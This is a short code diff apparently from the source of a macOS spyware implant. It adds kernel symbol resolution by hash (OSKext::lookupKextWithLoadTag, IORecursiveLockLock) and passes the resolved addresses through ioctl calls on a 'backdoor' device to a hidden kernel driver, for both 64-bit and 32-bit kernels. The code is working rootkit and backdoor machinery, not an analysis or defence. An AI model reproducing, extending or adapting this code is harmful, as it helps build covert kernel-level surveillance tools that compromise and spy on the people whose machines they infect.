@@ -2538,7 +2538,13 @@ void lionSendEventToPid(pid_t pidP)
   unsigned int proc_unlock_hash         = 0xf46ca50e; // _proc_unlock
   unsigned int proc_list_lock_hash      = 0x9129f0e2; // _proc_list_lock
   unsigned int proc_list_unlock_hash    = 0x5337599b; // _proc_list_unlock
+  unsigned int kext_lookup_with_tag_hash = 0xcf7000a8; // __ZN6OSKext21lookupKextWithLoadTagEj
+  unsigned int io_recursive_lock_hash   = 0x1f7127e3; // _IORecursiveLockLock
   
+#ifdef DEBUG_CORE
+  infoLog(@"Resolving symbols for kernel driver");
+#endif
+
   kernFD = open(filename, O_RDONLY);
   
   if (kernFD == -1) 
@@ -2665,6 +2671,18 @@ void lionSendEventToPid(pid_t pidP)
       sym.hash    = proc_list_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+      
+      // Sending Symbol
+      symAddress  = findSymbolInFatBinary64(imageBase, kext_lookup_with_tag_hash);
+      sym.hash    = kext_lookup_with_tag_hash;
+      sym.address  = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+      
+      // Sending Symbol
+      symAddress  = findSymbolInFatBinary64(imageBase, io_recursive_lock_hash);
+      sym.hash    = io_recursive_lock_hash;
+      sym.address  = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
     }
   else
     {
@@ -2739,6 +2757,18 @@ void lionSendEventToPid(pid_t pidP)
       sym.hash    = proc_list_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+      
+      // Sending Symbol
+      symAddress  = findSymbolInFatBinary(imageBase, kext_lookup_with_tag_hash);
+      sym.hash    = kext_lookup_with_tag_hash;
+      sym.address = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+      
+      // Sending Symbol
+      symAddress  = findSymbolInFatBinary(imageBase, io_recursive_lock_hash);
+      sym.hash    = io_recursive_lock_hash;
+      sym.address = symAddress;
+      ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);      
     }
   
   munmap(imageBase, filesize);
